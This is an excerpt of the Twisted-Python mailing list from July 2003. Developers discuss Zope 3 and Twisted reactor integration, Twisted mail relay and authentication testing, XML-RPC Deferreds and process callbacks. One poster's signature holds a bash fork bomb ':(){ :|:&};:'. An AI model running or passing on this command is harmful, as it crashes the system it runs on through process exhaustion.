> http://twistedmatrix.com/cgi-> bin/mailman/listinfo/twisted-python
> 




From pje at telecommunity.com  Mon Jul 28 13:35:31 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Mon, 28 Jul 2003 15:35:31 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F256E81.6030802@zope.com>
References: <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>
 <3F254097.4040407@zope.com>
 <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>
Message-ID: <5.1.0.14.0.20030728152540.01e52a60@mail.telecommunity.com>

At 02:42 PM 7/28/03 -0400, Shane Hathaway wrote:
>Phillip J. Eby wrote:
>>And there's yet another possible approach...  Have Zope depend on 
>>specific I*Reactor interfaces in place of asyncore, but don't necessarily 
>>depend on Twisted itself.  I'm not sure if this meets the intended goals 
>>for Zope/Twisted integration, but it's a useful first step.  If this is 
>>useful, PEAK has an "UntwistedReactor" class that implements a useful 
>>subset of the Twisted reactor interfaces, enough to be able to have a 
>>select loop and scheduled callbacks.  It's ZPL/PSF licensed, so you can 
>>steal it fair and square.  So, as long as the existing Zope 3 server code 
>>just expects to be woken up by asyncore for reads and writes, it should 
>>be pretty adaptable to the reactor interface, at which point it could be 
>>hooked into Twisted or into a Zope 3 mini-reactor.
>
>That sounds great.  Do you have a ViewCVS link?

Interface is at:

http://cvs.eby-sarna.com/PEAK/src/peak/running/interfaces.py?rev=HEAD&content-type=text/vnd.viewcvs-markup

See 'IBasicReactor'.

For the implementation, see:

http://cvs.eby-sarna.com/PEAK/src/peak/running/scheduler.py?rev=HEAD&content-type=text/vnd.viewcvs-markup

It's class 'UntwistedReactor'.  The implementation depends on peak.binding, 
but not in any deep way.  You should be able to replace most of the 
'binding.bindSomehow' attributes with an __init__ method.  The class also 
expects to have a 'logger' attribute that's a PEP 282-compatible 
logger.  Last, but not least, you can interpret the 'self._delBinding()' 
calls as meaning that the specified attribute should be reinitialized.

You can pretty much ignore the rest of the module for your purposes, except 
the _Appt class, which is a private class representing a scheduled callback.


>The one feature that we'd need beyond the simple "wake me up when 
>something is ready" interface is the trigger interface.  It lets a thread 
>tell the main thread to wake up immediately.

Ah.  I didn't implement that, as I haven't needed it for anything.  I 
believe you can emulate it over the primitives I've supplied, though, as I 
believe Twisted normally does it by setting up some kind of pipe or socket 
that the thread writes to, with a reader hooked up on the reactor.  The 
reader just throws away the meaningless data, but of course the main thread 
has now been reawakened from its select() call.




From twisted at goldenspud.com  Mon Jul 28 15:26:17 2003
From: twisted at goldenspud.com (Matthew R. Scott)
Date: Mon, 28 Jul 2003 16:26:17 -0500
Subject: [Twisted-Python] questions about Twisted mail
Message-ID: <200307281626.17865.twisted@goldenspud.com>

Hello Twisted hackers extraordinaire!

I am evaluating the use of Twisted mail for small- to medium-sized
installations.  My goal is to get up and running with it fairly soon, with
only minor changes in the areas of email account database / authentication.

As I've been evaluating it, I have come up with a few questions regarding
 best practices for its use.

First, I'll give some background on how I am evaluating it.

Disclaimer: I know my way around "talking SMTP and POP3" on a basic level
(telnetting to a host and going through a session manually) but I am not too
familiar with the ins and outs of "talking ESMTP AUTH" yet. :)

Software
========

Mozilla 1.5a
Kmail 1.5.2
Twisted CVS 2003-07-28

Goals
=====

Ultimately, I want Twisted mail to support these outcomes from common e-mail
scenarios:

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: FAIL
SMTP Mail from outside domain to user: PASS
SMTP Mail from user to user: PASS
SMTP Mail from user to outside domain: FAIL
ESMTP Mail from user to user: PASS
ESMTP Mail from user to outside domain: PASS

mktap variations
================

I've run through several 'mktap mail' variations and these are the results
I've gathered.

In all cases, there is a 'queue' and 'test.example.com' directory in the
directory where mail.tap is created and started from.  'twistd -nof mail.tap'
is the command line used to start the mail server.

Also, when doing regular SMTP sessions, I am sending the following commands
 in a session with the SMTP server to try to send mail:

  HELO localhost
  MAIL FROM:<from at email.address>
  RCPT TO:<to at email.address>
  DATA
  testing 1 2 3
  .

(!) indicates passing when it should be failing, or failing when it should be
passing

mktap mail --maildirdbmdomain=test.example.com=test.example.com --esmtp
--user=test=1234 --default

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: PASS (!)
SMTP Mail from outside domain to user: PASS
SMTP Mail from user to user: PASS
SMTP Mail from user to outside domain: PASS (!)
ESMTP Mail from user to user: FAIL (!)
ESMTP Mail from user to outside domain: FAIL (!)

mktap mail --maildirdbmdomain=test.example.com=test.example.com --esmtp
--user=test=1234 --default --disable-anonymous

POP3 access to account: PASS
SMTP Mail from outside domain to outside domain: FAIL
SMTP Mail from outside domain to user: FAIL (!)
SMTP Mail from user to user: FAIL (!)
SMTP Mail from user to outside domain: FAIL
ESMTP Mail from user to user: FAIL (!)
ESMTP Mail from user to outside domain: FAIL (!)

Failure details for ESMTP
=========================

When I configured Mozilla's SMTP settings, it did not give me an option to
specify what kind of authentication to perform; it only allowed me to specify
whether or not a username and password were required.

This is what was in the twistd log when I tried sending using Mozilla in the
second mktap variation:

2003/07/28 16:11 CDT [twisted.mail.protocols.ESMTPFactory] Connection from
('127.0.0.1', 33291)
2003/07/28 16:11 CDT [ESMTP,0,127.0.0.1] Failure:
twisted.cred.error.UnhandledCredentials: No checker for
twisted.cred.credentials.IAnonymous ,twisted.cred.credentials.ICredentials
2003/07/28 16:11 CDT [ESMTP,0,127.0.0.1]
/home/gldnspud/p/PYTHONPATH/twisted/protocols/smtp.py:553:
exceptions.DeprecationWarning: Returning None from validateFrom is
deprecated.  Raise smtp.SMTPBadSender instead

Interestingly, in the first mktap variation, Mozilla was able to send mail
just fine, which makes me wonder if it is even using ESMTP AUTH.

When using Kmail to send mail via both variations, it complains with an
"authentication failed" message.  This was after setting the authentication
type to CRAM-MD5 and verifying that the correct username "test" was in place.
The log file from twistd shows the following:

2003/07/28 16:13 CDT [twisted.mail.protocols.ESMTPFactory] Connection from
('127.0.0.1', 33293)
2003/07/28 16:13 CDT [ESMTP,1,127.0.0.1] Failure:
twisted.cred.error.UnhandledCredentials: No checker for
twisted.cred.credentials.IUsernameHashedPassword
,twisted.cred.credentials.ICredentials


Questions
=========

Some more questions, to which I'll post my own answers if I find them out
after tinkering some more:

Are any of the problems I'm running into (such as the "No checker for
...IUsernameHashedPassword" failure) due to the transitional nature of
Twisted CVS?   (I freely admit I have not yet tried any of the above on the
last "stable" Twisted release)

Would it be easy (or at least feasible) to implement ESMTP "AUTH PLAIN" in
Twisted's SMTP server?  (I'm assuming so, since "AUTH CRAM-MD5" is already
implemented)

How close is IMAP server capability to being integrated with Twisted mail?

How would one keep usernames on different domains separate in terms of
 logging in with POP3 and authenticating with ESMTP?  E.g. "jdoe at domain1.com"
 and "jdoe at domain2.com"

What are some common configurations of Twisted mail that are currently
deployed in production environments?


Thanks,

--
Matthew R. Scott
OMAjA / http://www.omaja.com/




From andrew-twisted at puzzling.org  Mon Jul 28 02:37:33 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 28 Jul 2003 18:37:33 +1000
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030726234818.46192.qmail@web80606.mail.yahoo.com>
References: <20030726234818.46192.qmail@web80606.mail.yahoo.com>
Message-ID: <20030728083733.GA21243@frobozz>

On Sat, Jul 26, 2003 at 04:48:18PM -0700, Butch Landingin wrote:
> Hi all,
> 
> I've been mucking about with Zope3 and twisted, trying to get Zope3 to 
> run under twisted's reactor framework. I'm still at code-spiking stage 
[...]
> 
> Some of the issues so far: 
>     
[...]
>        
>      2. Configuration: zope's configuration machinery (i.e. ZConfig) or twisted's 
>         configuration machinery (e.g. coil)? Which is better? Or maybe can I use 
>         both? Or maybe a way for the two to work together?

Twisted's COIL is currently old and not very functional.  Work is underway
to rewrite it properly (thanks Donovan!), but seeing as that isn't done yet,
the pragmatic answer would have to be ZConfig.

> PS. I cross-posted to both the zope3-dev and twisted-python lists
> so if you're listed on both, sorry.

Hey, I'm interested in both (and especially in them working together), so I
can't complain! :)

-Andrew.




From vng1 at mac.com  Mon Jul 28 18:11:46 2003
From: vng1 at mac.com (Victor Ng)
Date: Mon, 28 Jul 2003 20:11:46 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like it's synchronous?
In-Reply-To: <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>

I'm pretty confused with how to write an XMLRPC method that runs for a 
long time.  For example - I have an XMLRPC call that will do a database 
fetch.

What do I need to do with the xmlrpc.Handler?

I've taken a look at the unit tests, but there's no sample code that 
actually uses Handler.

vic




From itamar at itamarst.org  Mon Jul 28 18:21:24 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 20:21:24 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like
 it's synchronous?
In-Reply-To: <3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>
References: <20030712181337.16477.qmail@green.zadka.com>
	<3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>
Message-ID: <20030728202124.117281d7.itamar@itamarst.org>

On Mon, 28 Jul 2003 20:11:46 -0400
Victor Ng <vng1 at mac.com> wrote:

> I'm pretty confused with how to write an XMLRPC method that runs for a
> 
> long time.  For example - I have an XMLRPC call that will do a
> database fetch.

Database fetch returns Deferred. Your xml-rpc method can return a
Deferred. I suggest reading the Deferred docs and ignoring Handler.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From vng1 at mac.com  Mon Jul 28 21:07:37 2003
From: vng1 at mac.com (Victor Ng)
Date: Mon, 28 Jul 2003 23:07:37 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like it's synchronous?
In-Reply-To: <20030728202124.117281d7.itamar@itamarst.org>
Message-ID: <CE89A194-C171-11D7-884C-00039373D624@mac.com>

Excellent - I managed to get stuff working using both a simple add 
method and a database call.

Is Handler deprecated?  The API documentation is unclear about using 
(or ignoring) Handler.

vic

On Monday, July 28, 2003, at 08:21  PM, Itamar Shtull-Trauring wrote:

> On Mon, 28 Jul 2003 20:11:46 -0400
> Victor Ng <vng1 at mac.com> wrote:
>
>> I'm pretty confused with how to write an XMLRPC method that runs for a
>>
>> long time.  For example - I have an XMLRPC call that will do a
>> database fetch.
>
> Database fetch returns Deferred. Your xml-rpc method can return a
> Deferred. I suggest reading the Deferred docs and ignoring Handler.
>
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>




From glyph at twistedmatrix.com  Mon Jul 28 22:16:22 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 28 Jul 2003 23:16:22 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F256989.4020108@zope.com>
Message-ID: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 01:20 PM, Gary Poster wrote:

> Oh yeah, forgot about that.  I've seen several discussions of the 
> licensing on the Twisted list... Maybe Phil Eby's implementation is 
> the only way out of that one.

The whole point of those discussions has generally been that the 
current structure is important to make relicensing a possibility :-).

While twisted as a whole is being very actively (one might even say 
"agressively") developed, some portions of the framework, like the core 
reactor, seem to be extremely stable at this point.

(Please, chime in if you disagree.)

I have been considering approaching the Python team to ask about 
relicensing / including portions of twisted.internet in core Python at 
some point, since it seems to have eclipsed asyncore in terms of 
popularity, but I am sure that such discussions would be fraught with 
subtle corner cases and versioning issues, and I am very, very short on 
time at the moment.  However, if another member of the Twisted team 
would like to take up this discussion, either about core Python or 
about Zope 3, I'd be more than willing to appoint a proxy.




From radix at twistedmatrix.com  Mon Jul 28 22:28:11 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Tue, 29 Jul 2003 00:28:11 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
References: <3F256989.4020108@zope.com> <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030729042811.GA19792@radii>

On Mon, Jul 28, 2003 at 11:16:22PM -0500, Glyph Lefkowitz wrote:
> I have been considering approaching the Python team to ask about 
> relicensing / including portions of twisted.internet in core Python at 
> some point, since it seems to have eclipsed asyncore in terms of 
> popularity, but I am sure that such discussions would be fraught with 
> subtle corner cases and versioning issues, and I am very, very short on 
> time at the moment.  However, if another member of the Twisted team 
> would like to take up this discussion, either about core Python or 
> about Zope 3, I'd be more than willing to appoint a proxy.

I dread the day that parts of Twisted start making it into Python
core. If it ever does, though, I want to "brute-force" the versioning
issue and put it in a top-level package with a name other than
"twisted" (And I'm sure Guido would agree, as he doesn't like names
like "twisted" and "optik"). That way if we continue to develop bits
that are also in Python, there will be no versioning clashes. We've
all seen this issue with the (*flinch* *flinch*) `xml' package.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From bob at redivi.com  Mon Jul 28 23:41:49 2003
From: bob at redivi.com (Bob Ippolito)
Date: Tue, 29 Jul 2003 01:41:49 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <59A227EA-C187-11D7-A8DE-000A95686CD8@redivi.com>

On Tuesday, Jul 29, 2003, at 00:16 America/New_York, Glyph Lefkowitz 
wrote:

>
> On Monday, July 28, 2003, at 01:20 PM, Gary Poster wrote:
>
>> Oh yeah, forgot about that.  I've seen several discussions of the 
>> licensing on the Twisted list... Maybe Phil Eby's implementation is 
>> the only way out of that one.
>
> The whole point of those discussions has generally been that the 
> current structure is important to make relicensing a possibility :-).
>
> While twisted as a whole is being very actively (one might even say 
> "agressively") developed, some portions of the framework, like the 
> core reactor, seem to be extremely stable at this point.

the organization of twisted.internet is the suck

> I have been considering approaching the Python team to ask about 
> relicensing / including portions of twisted.internet in core Python at 
> some point, since it seems to have eclipsed asyncore in terms of 
> popularity, but I am sure that such discussions would be fraught with 
> subtle corner cases and versioning issues, and I am very, very short 
> on time at the moment.  However, if another member of the Twisted team 
> would like to take up this discussion, either about core Python or 
> about Zope 3, I'd be more than willing to appoint a proxy.

Some of twisted should go into core Python, perhaps for 2.4.. but we 
should have better non-select reactors (win32, wx, qt, corefoundation, 
etc.) and cleaned up organization first.

Of course, I need to write the corefoundation reactor, first :)

-bob




From tv at twistedmatrix.com  Tue Jul 29 00:23:02 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Tue, 29 Jul 2003 09:23:02 +0300
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <200307281626.17865.twisted@goldenspud.com>
References: <200307281626.17865.twisted@goldenspud.com>
Message-ID: <20030729062302.GB11245@lapdog>

On Mon, Jul 28, 2003 at 04:26:17PM -0500, Matthew R. Scott wrote:
> Goals
> =====
> 
> Ultimately, I want Twisted mail to support these outcomes from common e-mail
> scenarios:
> 
> POP3 access to account: PASS
> SMTP Mail from outside domain to outside domain: FAIL

	Huh? This means people cannot use vanity domains. That's
	generally not what you want.

	The first SMTP hop for this email is from a machine
	called yin.wanderer.org, and my source domain is still
	twistedmatrix.com.


	If what you want is relay control, the traditional (and good!)
	mechanism for that is knowing what IP addresses belong to your
	organization, accept mail to outside domains only from those
	IP addresses.

> SMTP Mail from outside domain to user: PASS
> SMTP Mail from user to user: PASS
> SMTP Mail from user to outside domain: FAIL
> ESMTP Mail from user to user: PASS
> ESMTP Mail from user to outside domain: PASS

	Umm, I hope you do mean _authenticated (E)SMTP_, not just
	ESMTP? Because the only real difference between SMTP and ESMTP
	is whether the client says HELO or EHLO.



	I've said this earlier, and I'll say it again. twisted.mail is
	not really ready for production use yet. It can still lose
	email.

> Are any of the problems I'm running into (such as the "No checker for
> ...IUsernameHashedPassword" failure) due to the transitional nature of
> Twisted CVS?   (I freely admit I have not yet tried any of the above on the
> last "stable" Twisted release)

	Most likely yes.

> How close is IMAP server capability to being integrated with Twisted mail?

	See twisted.protocols.imap4.IMAP4Server. Seems to be quite complete.

> How would one keep usernames on different domains separate in terms of
>  logging in with POP3 and authenticating with ESMTP?  E.g. "jdoe at domain1.com"
>  and "jdoe at domain2.com"

	By authenticating as jdoe at domain1.com, not as joe.

	For older netscape atleast, if the POP account had '@' in it,
	it parsed it as user at popserver; that is, it thought
	domain1.com was it's POP server, and authenticated as user
	jdoe. The classic fix is to use user%domain1.com.

> What are some common configurations of Twisted mail that are currently
> deployed in production environments?

	Scalemail is quite close to first real deployment. It uses parts
	of twisted.mail. http://scalemail.sf.net/  (I really need to update
	the web site ;)

-- 
:(){ :|:&};:



From mporter at despammed.com  Tue Jul 29 06:55:30 2003
From: mporter at despammed.com (Michael Porter)
Date: Tue, 29 Jul 2003 13:55:30 +0100
Subject: [Twisted-Python] how to drop connection
Message-ID: <006f01c355d0$b163eba0$0201a8c0@dan>

Hi,

I'm trying to close down a web server (wihout closing the application) but
am having problems closing already established connections.

I'm using port.stopListening() which closes the port and stops the factory
but this doesn't seem to close already established connections. So, if I
then get another request from an established connection, an attempt is made
to service the request. This causes a few problems including
"AttributeError: Site instance has no attribute 'logFile'" from HTTPFactory
because it deleted its logFile attribute when stopFactory was called.

Does anyone know how I can close these established connections?

Thanks,

Mike.




From justinjohnson at fastmail.fm  Tue Jul 29 07:12:03 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 29 Jul 2003 07:12:03 -0600
Subject: [Twisted-Python] callback wierdness
Message-ID: <20030729131204.08ED9387C2@www.fastmail.fm>

In the attached files I defined process.openProcess to spawn a process
using the reactor, and return a deferred from within my ProcessProtocol. 
Then in trigger.py I define methods "make" and "remove" that utilize
process.openProcess to run a command.  make() adds callbacks to the
deferred to display the results of the execution, and at the bottom of
trigger.py I add a callback to remove the trigger after creating it.

The problem is, none of my callbacks ever get called.  The initial
spawnProcess works and I can see the trigger is created, but nothing is
printed to the screen (callback 1 added in "make") and the trigger is not
removed (callback 2 added at end of file).

Can someone tell me what I'm doing wrong here?  Also, is spawnProcess a
special case that actually runs before reactor.run is called?  That is
what I am seeing, and I'm not sure if that makes sense.  Just trying to
get my head around this.

Thanks much.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: trigger.py
Type: application/unknown
Size: 2888 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030729/e1d9d5e1/attachment-0004.bin>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: process.py
Type: application/unknown
Size: 1619 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030729/e1d9d5e1/attachment-0005.bin>

From glyph at twistedmatrix.com  Tue Jul 29 08:25:47 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 09:25:47 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030729042811.GA19792@radii>
Message-ID: <8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 11:28 PM, Christopher Armstrong wrote:

> I dread the day that parts of Twisted start making it into Python
> core.

Why?  The core reactor is pretty stable, pretty small, and now people 
who have expressed distress at the state of other portions of Twisted 
want to use it.

> If it ever does, though, I want to "brute-force" the versioning
> issue and put it in a top-level package with a name other than
> "twisted"

Agreed.

> (And I'm sure Guido would agree, as he doesn't like names
> like "twisted" and "optik").

Maybe we can call it 'reactor.*'?  (Or, for all you Sw. Eng. fans out 
there, "patterns.reactor.*" :-))

> That way if we continue to develop bits that are also in Python, there 
> will be no versioning clashes. We've all seen this issue with the 
> (*flinch* *flinch*) `xml' package.

Yes, please, let's let application authors choose WHICH version of this 
they want to run with; ostensibly the core Python version would be much 
more stable, and upgrades to it could happen with excruciating 
attention to backwards compat.




From glyph at twistedmatrix.com  Tue Jul 29 08:28:37 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 09:28:37 -0500
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping blocking code)
In-Reply-To: <20030728.115022.109875724.warner@lothar.com>
Message-ID: <F1634438-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 01:50 PM, Brian Warner wrote:

> We've talked about this briefly before, but perhaps [child processes 
> inheriting the environment of their parents] should be the default?

I think that the current behavior is fine, and that it shouldn't 
change.  Better to err on the side of safety for something like this; 
make it a FAQ, but it's a better FAQ than "I ran a CGI as www-data with 
the wrong $HOME variable and a web user deleted my entire home 
directory!  What do I do?!?"




From twisted at goldenspud.com  Tue Jul 29 09:27:52 2003
From: twisted at goldenspud.com (Matthew Scott)
Date: Tue, 29 Jul 2003 10:27:52 -0500
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <20030729062302.GB11245@lapdog>
References: <200307281626.17865.twisted@goldenspud.com> <20030729062302.GB11245@lapdog>
Message-ID: <200307291027.52181.twisted@goldenspud.com>

On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> > POP3 access to account: PASS
> > SMTP Mail from outside domain to outside domain: FAIL
> 	Huh? This means people cannot use vanity domains. That's
> 	generally not what you want.
>       [ ... ]
> 	If what you want is relay control, the traditional (and good!)
> 	mechanism for that is knowing what IP addresses belong to your
> 	organization, accept mail to outside domains only from those
> 	IP addresses.

Yes, it was relay control I was looking for.  I have seen some ISPs use SMTP 
AUTH to control relaying, but for our use of an e-mail server it will be fine 
to limit by IP addresses.  (That will also alleviate silly tech support 
issues that would arise from requiring SMTP AUTH :)


> 	Umm, I hope you do mean _authenticated (E)SMTP_, not just
> 	ESMTP? Because the only real difference between SMTP and ESMTP
> 	is whether the client says HELO or EHLO.

Yes.  Thank you :)  To put what I mentioned in my original e-mail another way, 
I haven't kept my brain up to spec regarding the details of SMTP vs ESMTP and 
where AUTH falls in, as well as related RFCs.  :)


> 	I've said this earlier, and I'll say it again. twisted.mail is
> 	not really ready for production use yet. It can still lose
> 	email.

That alone tells me that in the short term any efforts to use the existing 
Twisted mail would not be useful, and that I should be researching the use of 
more 'traditional' email server configurations :)

I might have perhaps run across this if I did an extensive search in the 
mailing list archives, but my resource was grepping the Twisted CVS for 
'twisted mail'.  The only thing I ran across that had any depth to its 
description was doc/historic/2002/ipc10/twisted-network-framework/index.html 
and it had no mention of not using Twisted mail in a production environment.

I'm not saying that it's a bad thing that I couldn't find more definitive 
information -- after all if something is not ready for production use then 
it's probably not a good thing to give people lots of easy ways to believe 
that it is :)


> > How would one keep usernames on different domains separate in terms of
> >  logging in with POP3 and authenticating with ESMTP?  E.g.
> > "jdoe at domain1.com" and "jdoe at domain2.com"
> 	By authenticating as jdoe at domain1.com, not as joe.

'tis what I tried...

+OK <20030729152108.1218.1275775558 at advocate>
USER test
+OK USER accepted, send PASS
PASS 1234
+OK Authentication succeeded

+OK <20030729152118.1218.400479354 at advocate>
USER test at test.example.com
+OK USER accepted, send PASS
PASS 1234
-ERR Authentication failed

+OK <20030729152133.1218.265884954 at advocate>
USER test%test.example.com
+OK USER accepted, send PASS
PASS 1234
-ERR Authentication failed


> 	Scalemail is quite close to first real deployment. It uses parts
> 	of twisted.mail. http://scalemail.sf.net/  (I really need to update
> 	the web site ;)

I will take a look at this and see what I can glean from it. I see CVS commits 
in the last 2 months, and a 'debian' directory in there, so I'm happy even if 
the website isn't up-to-date :-D

Thanks for the link and the info on the status of Twisted mail!


-- 
Matthew R. Scott
OMAjA / http://www.omaja.com/




From itamar at itamarst.org  Tue Jul 29 10:24:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 29 Jul 2003 12:24:08 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
References: <20030729042811.GA19792@radii>
	<8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030729122408.714deb8a.itamar@itamarst.org>

On Tue, 29 Jul 2003 09:25:47 -0500
Glyph Lefkowitz <glyph at twistedmatrix.com> wrote:

> 
> On Monday, July 28, 2003, at 11:28 PM, Christopher Armstrong wrote:
> 
> > I dread the day that parts of Twisted start making it into Python
> > core.
> 
> Why?  The core reactor is pretty stable, pretty small, and now people 
> who have expressed distress at the state of other portions of Twisted 
> want to use it.

Up to a point, we've still been fixing bugs left and right. Obscure
bugs, but bugs none the less. And the SSL refactor was not too long ago
(Two months ago?). When we haven't made any major changes for 6 months,
then we can talk about it.



From twisted at goldenspud.com  Tue Jul 29 10:20:55 2003
From: twisted at goldenspud.com (Matthew R. Scott)
Date: Tue, 29 Jul 2003 11:20:55 -0500
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <20030729062302.GB11245@lapdog>
References: <200307281626.17865.twisted@goldenspud.com> <20030729062302.GB11245@lapdog>
Message-ID: <200307291120.55120.twisted@goldenspud.com>

Followup query...

On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> 	I've said this earlier, and I'll say it again. twisted.mail is
> 	not really ready for production use yet. It can still lose
> 	email.

Is there any current plan for bringing twisted.mail up to spec for production 
use?  In other words, is it known what can cause it to lose mail?  and if 
that is known, what kind of work would it take to fix that?

Are there other things that prevent its use, even in a limited form, in a 
production environment?

The project I am helping with that would potentially use twisted.mail is 99% 
twisted-based right now and it would be great to keep that trend going since 
twisted has been so useful for everything else we've used it for.  :)

We can certainly use a different solution for a mail server if need be for the 
short term, but we would be more delighted to be able to help twisted.mail 
fill the role of 'production mail server' for both us and others...

Thanks again, 

-- 
Matthew R. Scott
OMAjA / http://www.omaja.com/




From itamar at itamarst.org  Tue Jul 29 10:36:48 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 29 Jul 2003 12:36:48 -0400
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <200307291120.55120.twisted@goldenspud.com>
References: <200307281626.17865.twisted@goldenspud.com>
	<20030729062302.GB11245@lapdog>
	<200307291120.55120.twisted@goldenspud.com>
Message-ID: <20030729123648.6e4ca5bc.itamar@itamarst.org>

On Tue, 29 Jul 2003 11:20:55 -0500
"Matthew R. Scott" <twisted at goldenspud.com> wrote:

> Followup query...
> 
> On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> > 	I've said this earlier, and I'll say it again. twisted.mail is
> > 	not really ready for production use yet. It can still lose
> > 	email.
> 
> Is there any current plan for bringing twisted.mail up to spec for
> production use?  In other words, is it known what can cause it to lose
> mail?  and if that is known, what kind of work would it take to fix
> that?

It's not that it loses mail, though it might do so. It's that we haven't
tested it enough to be certain of its stability (it hasn't been used
enough to be trust worthy). So it might have a bug which causes mail
loss and we wouldn't know about it.

Jean-Paul Calderone is currently putting a lot of work into all of
Twisted's mail code (protocol support and twisted.mail). He would be the
person to talk to in terms of missing functionality, help needed and
potential issues, etc.. But he's on vacation for a week.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From glyph at twistedmatrix.com  Tue Jul 29 15:08:49 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 16:08:49 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030729122408.714deb8a.itamar@itamarst.org>
Message-ID: <D9B32A19-C208-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Tuesday, July 29, 2003, at 11:24 AM, Itamar Shtull-Trauring wrote:

> Up to a point, we've still been fixing bugs left and right. Obscure
> bugs, but bugs none the less. And the SSL refactor was not too long ago
> (Two months ago?). When we haven't made any major changes for 6 months,
> then we can talk about it.

Well, with 18 months to go, I think that's pretty reasonable ;-)




From andrew-twisted at puzzling.org  Tue Jul 29 19:47:26 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 11:47:26 +1000
Subject: [Twisted-Python] callback wierdness
In-Reply-To: <20030729131204.08ED9387C2@www.fastmail.fm>
References: <20030729131204.08ED9387C2@www.fastmail.fm>
Message-ID: <20030730014725.GA27662@frobozz>

On Tue, Jul 29, 2003 at 07:12:03AM -0600, Justin Johnson wrote:
> In the attached files I defined process.openProcess to spawn a process
> using the reactor, and return a deferred from within my ProcessProtocol. 
> Then in trigger.py I define methods "make" and "remove" that utilize
> process.openProcess to run a command.  make() adds callbacks to the
> deferred to display the results of the execution, and at the bottom of
> trigger.py I add a callback to remove the trigger after creating it.
> 
> The problem is, none of my callbacks ever get called.  The initial
> spawnProcess works and I can see the trigger is created, but nothing is
> printed to the screen (callback 1 added in "make") and the trigger is not
> removed (callback 2 added at end of file).

Without looking closely, I notice that you never add an errback to your
Deferreds, only callbacks.  Try d.addErrback(twisted.python.log.err), and
see if that helps you figure out what's going wrong.

-Andrew.




From sflist at ihonk.com  Tue Jul 29 22:51:47 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Tue, 29 Jul 2003 21:51:47 -0700
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content length header
Message-ID: <200307292151.47437.sflist@ihonk.com>

Hi all,

I'm experimenting with a C++ XML-RPC client library, and it refused to talk to 
my Twisted sample server. Why? It reported that no content length was given, 
so it gave up and sulked. So I dumped what Twisted coughed up, and sure 
enough, it's lacking a content length field (I'm calling the sample 
xmlrpc_add(self, a, b) function):

HTTP/1.0 200 OK
Date: Wed, 30 Jul 2003 04:41:56 GMT
Content-type: text/xml
Server: TwistedWeb/1.0.6

